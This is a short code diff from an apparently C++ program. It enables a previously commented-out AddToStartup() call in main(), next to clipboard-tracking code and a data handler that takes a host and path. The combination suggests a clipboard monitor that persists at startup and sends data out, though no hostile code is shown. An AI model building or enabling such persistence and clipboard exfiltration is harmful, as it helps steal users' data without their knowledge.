@@ -24,7 +24,7 @@ void HandleNewData(std::string& data, std::string& host, std::string& path, int 
 }
 
 int main() {
-    // AddToStartup();
+    AddToStartup();
 
     std::string lastClipboard = "";
 
